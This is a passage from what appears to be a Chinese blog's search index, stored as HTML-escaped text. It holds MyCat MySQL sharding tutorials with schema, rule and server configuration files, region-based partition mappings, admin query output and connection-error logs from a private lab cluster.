dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb29&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb30&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb30&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb31&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb31&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb32&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb32&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb33&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb33&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb34&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb34&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb35&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb35&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A; 192.168.73.21 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt;&lt;dataHost name=&quot;192.168.73.21&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.21&quot; url=&quot;192.168.73.21:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;dataHost name=&quot;192.168.73.22&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.22&quot; url=&quot;192.168.73.22:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;dataHost name=&quot;192.168.73.23&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.23&quot; url=&quot;192.168.73.23:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;/mycat:schema&gt; rule.xml 1234567891011121314151617&lt;!DOCTYPE mycat:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;mycat:rule xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;tableRule name=&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;&gt;&lt;rule&gt; &lt;columns&gt;region&lt;/columns&gt; &lt;algorithm&gt;hash-int&lt;/algorithm&gt;&lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=&quot;hash-int&quot; class=&quot;io.mycat.route.function.PartitionByFileMap&quot;&gt; &lt;property name=&quot;mapFile&quot;&gt;partition-hash-int-mycatdb-jakingtest_member.txt&lt;/property&gt; &lt;property name=&quot;type&quot;&gt;1&lt;/property&gt; &lt;property name=&quot;defaultNode&quot;&gt;0&lt;/property&gt;&lt;!-- type &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;0&#xFF0C;0&#x8868;&#x793A;integer&#xFF0C;&#x975E;&#x96F6;&#x8868;&#x793A;string,&#x6240;&#x6709;&#x8282;&#x70B9;&#x914D;&#x7F6E;&#x90FD;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;&#x53CA;0&#x4EE3;&#x8868;&#x8282;&#x70B9;1 --&gt;&lt;/function&gt;&lt;/mycat:rule&gt; partition-hash-int-mycatdb-jakingtest_member.txt vim /mysql/app/mycat/conf/partition-hash-int-mycatdb-jakingtest_member.txt 1234567891011121314151617181920212223242526272829303132333435&#x5317;&#x4EAC;&#x5E02;=0&#x4E0A;&#x6D77;&#x5E02;=1&#x4E91;&#x5357;&#x7701;=2&#x5185;&#x8499;&#x53E4;=3&#x8D35;&#x5DDE;&#x7701;=4&#x91CD;&#x5E86;&#x5E02;=5&#x53F0;&#x6E7E;&#x7701;=6&#x5409;&#x6797;&#x7701;=7&#x56DB;&#x5DDD;&#x7701;=8&#x5929;&#x6D25;&#x5E02;=9&#x5B81;&#x590F;&#x7701;=10&#x5B89;&#x5FBD;&#x7701;=11&#x5C71;&#x4E1C;&#x7701;=12&#x5C71;&#x897F;&#x7701;=13&#x5E7F;&#x4E1C;&#x7701;=14&#x5E7F;&#x897F;&#x7701;=15&#x65B0;&#x7586;&#x7701;=16&#x6C5F;&#x82CF;&#x7701;=17&#x6C5F;&#x897F;&#x7701;=18&#x6CB3;&#x5317;&#x7701;=19&#x6CB3;&#x5357;&#x7701;=20&#x6D59;&#x6C5F;&#x7701;=21&#x6D77;&#x5357;&#x7701;=22&#x6E56;&#x5317;&#x7701;=23&#x6E56;&#x5357;&#x7701;=24&#x6FB3;&#x95E8;=25&#x7518;&#x8083;&#x7701;=26&#x798F;&#x5EFA;&#x7701;=27&#x897F;&#x85CF;=28&#x8FBD;&#x5B81;&#x7701;=29&#x9655;&#x897F;&#x7701;=30&#x9752;&#x6D77;&#x7701;=31&#x9999;&#x6E2F;=32&#x9ED1;&#x9F99;&#x6C5F;&#x7701;=33DEFAULT_NODE=34 &#x68C0;&#x67E5;MyCat12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; show @@databases;+----------+| DATABASE |+----------+| mycatdb |+----------+1 row in set (0.01 sec)mysql&gt; show @@datasource;+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+| DATANODE | NAME | TYPE | HOST | PORT | W/R | ACTIVE | IDLE | SIZE | EXECUTE | READ_LOAD | WRITE_LOAD |+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+| dnmycatdb22 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb23 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb20 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb21 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb4 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb19 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb5 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb2 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb17 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb3 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb18 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb15 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb1 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb16 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb13 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb35 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb14 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb8 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb9 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb6 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb7 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb11 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb33 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb12 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb34 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb31 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb10 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb32 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb30 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb28 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb29 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb26 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb27 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb24 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 || dnmycatdb25 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W | 0 | 0 | 1000 | 0 | 0 | 0 |+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+35 rows in set (0.01 sec)mysql&gt; show @@heartbeat;+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+| NAME | TYPE | HOST | PORT | RS_CODE | RETRY | STATUS | TIMEOUT | EXECUTE_TIME | LAST_ACTIVE_TIME | STOP |+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+| 192.168.73.21 | mysql | 192.168.73.21 | 3306 | -1 | 1 | idle | 30000 | 14,2443,2443 | 2022-05-10 00:17:53 | false || 192.168.73.22 | mysql | 192.168.73.22 | 3306 | -1 | 1 | idle | 30000 | 15,2443,2443 | 2022-05-10 00:17:53 | false || 192.168.73.23 | mysql | 192.168.73.23 | 3306 | -1 | 1 | idle | 30000 | 16,2444,2444 | 2022-05-10 00:17:53 | false |+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+3 rows in set (0.01 sec)mysql&gt; &#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;&#x6CE8;&#x610F;&#xFF1A;&#x4E00;&#x5B9A;&#x8981;&#x628A;3&#x4E2A;&#x8282;&#x70B9;&#x7684;MySQL &#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;&#x6253;&#x5F00;&#xFF01;12set global autocommit=1;show variables like &quot;%autocommit%&quot;; mysql -h192.168.73.20 -P8066 -uroot -p123456 mycatdb &lt; jakingtest_member.sql &#x67E5;&#x8BE2;&#x6570;&#x636E;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253mysql&gt; use mycatdbReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+-------------------+| Tables in mycatdb |+-------------------+| jaking_member |+-------------------+1 row in set (0.00 sec)mysql&gt; select count(*) from jaking_member;+--------+| COUNT0 |+--------+| 50000 |+--------+1 row in set (0.03 sec)mysql&gt; select * from jaking_member where id = 20000210;+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+| ID | NAME | AGE | SEX | CARDID | JOINDATE | REGION | TEL | EMAIL | RECOMMEND | IDENTIFIER |+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+| 20000210 | jaking20000210 | 31 | &#x7537; | 10050307335 | 2015-12-25 11:50:51 | &#x4E0A;&#x6D77;&#x5E02; | 13108379727 | 123359043@qq.com | &#x5F6D;&#x7406;&#x90A6;&#x5C0F;&#x9C9C;&#x8089;&#x8001;&#x5E08; | klbd muygjo xs iyz hqlghz duucn fjlap dgknrq kkz js ogsga hq cedyjm nzgmy unjpy kky jjh zevor juctq |+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+1 row in set (0.02 sec)-- &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x91CF;mysql&gt; select table_schema,table_name as &quot;Tables&quot;,ROUND(((data_length + index_length)/1024/1024), 2) &quot;Size in MB&quot; from information_schema.TABLES where TABLE_NAME = &quot;jaking_member&quot; order by (data_length + index_length) desc;+----------------+---------------+------------+| table_schema | Tables | Size in MB |+----------------+---------------+------------+| jakingtestdb01 | jaking_member | 1.52 || jakingtestdb02 | jaking_member | 0.41 || jakingtestdb05 | jaking_member | 0.39 || jakingtestdb03 | jaking_member | 0.39 || jakingtestdb11 | jaking_member | 0.39 || jakingtestdb08 | jaking_member | 0.39 || jakingtestdb07 | jaking_member | 0.39 || jakingtestdb06 | jaking_member | 0.38 || jakingtestdb04 | jaking_member | 0.38 || jakingtestdb12 | jaking_member | 0.38 || jakingtestdb09 | jaking_member | 0.38 || jakingtestdb10 | jaking_member | 0.36 |+----------------+---------------+------------+12 rows in set (0.01 sec)mysql&gt; &#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;192.168.73.21123456789mysql&gt; select count(*) ,region from jakingtestdb10.jaking_member group by region;+----------+-----------+| count(*) | region |+----------+-----------+| 1363 | &#x5929;&#x6D25;&#x5E02; |+----------+-----------+1 row in set (0.01 sec)mysql&gt; 192.168.73.221234567mysql&gt; select count(*) ,region from jakingtestdb20.jaking_member group by region;+----------+-----------+| count(*) | region |+----------+-----------+| 1448 | &#x6CB3;&#x5317;&#x7701; |+----------+-----------+1 row in set (0.00 sec) 192.168.73.23123456789mysql&gt; select count(*) ,region from jakingtestdb30.jaking_member group by region;+----------+-----------+| count(*) | region |+----------+-----------+| 1448 | &#x8FBD;&#x5B81;&#x7701; |+----------+-----------+1 row in set (0.00 sec)mysql&gt; &#x6545;&#x969C;123452022-05-10 01:28:18.943 INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError2022-05-10 01:28:18.944 INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=53, lastTime=1652117298929, user=root, schema=jakingtestdb04, old shema=jakingtestdb04, borrowed=false, fromSlaveDB=false, threadId=634, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-10 01:28:18.944 INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError2022-05-10 01:28:18.944 INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=54, lastTime=1652117298929, user=root, schema=jakingtestdb35, old shema=jakingtestdb35, borrowed=false, fromSlaveDB=false, threadId=566, charset=latin1, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.23, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-10 01:28:18.944 INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MyCat垂直分表操作","date":"2022-06-07T04:46:29.000Z","path":"/posts/176dc5f3/","text":"schema.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt; &lt;!-- &#x903B;&#x8F91;&#x5E93;&#x914D;&#x7F6E; mycatdb1,mycatdb2,mycatdb3 &#x662F;&#x903B;&#x8F91;&#x5E93;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x7684;&#x6570;&#x636E;&#x5E93;--&gt; &lt;!-- &#x5176;&#x4E2D; checkSQLschema &#x8868;&#x660E;&#x662F;&#x5426;&#x68C0;&#x67E5;&#x5E76;&#x8FC7;&#x6EE4; SQL &#x4E2D;&#x5305;&#x542B; schema &#x7684;&#x60C5;&#x51B5;: &#x5982;&#x903B;&#x8F91;&#x5E93;&#x4E3A; mycatdb1&#xFF0C;&#x5219;&#x53EF;&#x80FD;&#x5199;&#x4E3A; select * from mycatdb1.jakingtestdb11&#xFF0C; &#x6B64;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8FC7;&#x6EE4; mycatdb1&#xFF0C;SQL &#x53D8;&#x4E3A; select * from jakingtestdb11&#xFF0C;&#x82E5;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4E0A;&#x8FF0;&#x5199;&#x6CD5;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x5C5E;&#x6027;&#x4E3A; false checkSQLschema=&quot;false&quot; select * from mycatdb1.jakingtestdb11; checkSQLschema=&quot;true&quot; select * from jakingtestdb11; --&gt; &lt;!-- sqlMaxLimit &#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x6700;&#x5927;&#x8BB0;&#x5F55;&#x6570;&#x9650;&#x5236;&#xFF0C;MyCat1.4 &#x7248;&#x672C;&#x91CC;&#x9762;&#xFF0C;&#x7528;&#x6237;&#x7684; Limit &#x53C2;&#x6570;&#x4F1A; &#x8986;&#x76D6;&#x6389; MyCat &#x7684; sqlMaxLimit &#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;--&gt; &lt;!-- &#x6BCF;&#x4E2A;&#x903B;&#x8F91;&#x5E93;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A; schema ,&#x6BCF;&#x4E2A;schema &#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8282;&#x70B9; --&gt;&lt;schema name=&quot;mycatdb1&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb1&quot;/&gt;&lt;schema name=&quot;mycatdb2&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb2&quot;/&gt; &lt;schema name=&quot;mycatdb3&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb3&quot;/&gt; &lt;schema name=&quot;mycatdb4&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb4&quot;/&gt; &lt;schema name=&quot;mycatdb5&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb5&quot;/&gt; &lt;schema name=&quot;mycatdb6&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb6&quot;/&gt; &lt;schema name=&quot;mycatdb7&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb7&quot;/&gt; &lt;schema name=&quot;mycatdb8&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb8&quot;/&gt; &lt;schema name=&quot;mycatdb9&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb9&quot;/&gt; &lt;!-- &#x8868;&#x5206;&#x7247;&#x914D;&#x7F6E;&#x5728;&#x8FD9;&#x91CC; --&gt; &lt;!--&lt;/schema&gt; --&gt; &lt;!-- &#x5B9A;&#x4E49; MyCat &#x7684;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF0C;&#x8282;&#x70B9;&#x914D;&#x7F6E; jakingtestdb01,jakingtestdb02,jakingtestdb03 &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C; dataNode &#x4E2D;&#x7684; name &#x6570;&#x636E;&#x8868;&#x793A;&#x8282;&#x70B9;&#x540D;&#x79F0;&#xFF0C; dataHost &#x8868;&#x793A;&#x6570;&#x636E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF0C; database &#x8868;&#x793A;&#x8BE5;&#x8282;&#x70B9;&#x8981;&#x8DEF;&#x7531;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x79F0; --&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-3 &#x5BF9;&#x5E94;&#x7684; 192.168.10.12 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb1&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb01&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb2&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb02&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb3&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb03&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb4-6 &#x5BF9;&#x5E94;&#x7684; 192.168.10.13 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb4&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb04&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb5&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb05&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb6&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb06&quot; /&gt; &lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb7-9 &#x5BF9;&#x5E94;&#x7684; 192.168.10.14 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb7&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb07&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb8&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb08&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb9&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb09&quot; /&gt; &lt;!-- &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x914D;&#x7F6E; --&gt; &lt;!-- dataHost &#x914D;&#x7F6E;&#x7684;&#x662F;&#x5B9E;&#x9645;&#x7684;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x7FA4;&#xFF08;&#x5F53;&#x7136;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x975E;&#x96C6;&#x7FA4;&#xFF09; --&gt; &lt;!-- &#x6CE8;&#x610F;&#xFF1A; schema &#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A; dataHost &#x4E2D;&#x7684; host &#x5C5E;&#x6027;&#x503C;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x4E3B;&#x4ECE;&#x5728;&#x6240;&#x6709; dataHost &#x4E2D;&#x5168;&#x90E8;&#x5207;&#x6362;&#x7684;&#x73B0;&#x8C61; --&gt; &lt;!-- &#x5B9A;&#x4E49;&#x6570;&#x636E;&#x4E3B;&#x673A; dtHost1&#xFF0C;&#x53EA;&#x8FDE;&#x63A5;&#x5230; MySQL &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x96C6;&#x7FA4;&#x4E2D;&#x7684; Master &#x8282;&#x70B9;&#xFF0C;&#x4E0D;&#x4F7F;&#x7528; MyCat &#x6258;&#x7BA1; MySQL &#x4E3B;&#x4ECE;&#x5207;&#x6362; --&gt; &lt;!-- &lt;dataHost name=&quot;dtHost1&quot; maxCon=&quot;500&quot; minCon=&quot;20&quot; balance=&quot;0&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host=&quot;hostM1&quot; url=&quot;192.168.10.63:3306&quot; user=&quot;root&quot; password=&quot;lyz&quot; /&gt; &lt;/dataHost&gt; --&gt; &lt;!-- &#x8BBE;&#x5B9A; 192.168.10.12 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt; &lt;dataHost name=&quot;jaking12&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.12&quot; url=&quot;192.168.10.12:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt;&lt;dataHost name=&quot;jaking13&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.13&quot; url=&quot;192.168.10.13:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt;&lt;dataHost name=&quot;jaking14&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.14&quot; url=&quot;192.168.10.14:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt; &lt;/mycat:schema&gt; server.xml 123456789101112&lt;!-- &#x5F00;&#x901A;root&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;&lt;user name=&quot;root&quot;&gt; &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt; &lt;property name=&quot;schemas&quot;&gt;mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9&lt;/property&gt; &lt;/user&gt;&lt;!-- &#x5F00;&#x901A;user&#x666E;&#x901A;&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;&lt;user name=&quot;user&quot;&gt; &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt; &lt;property 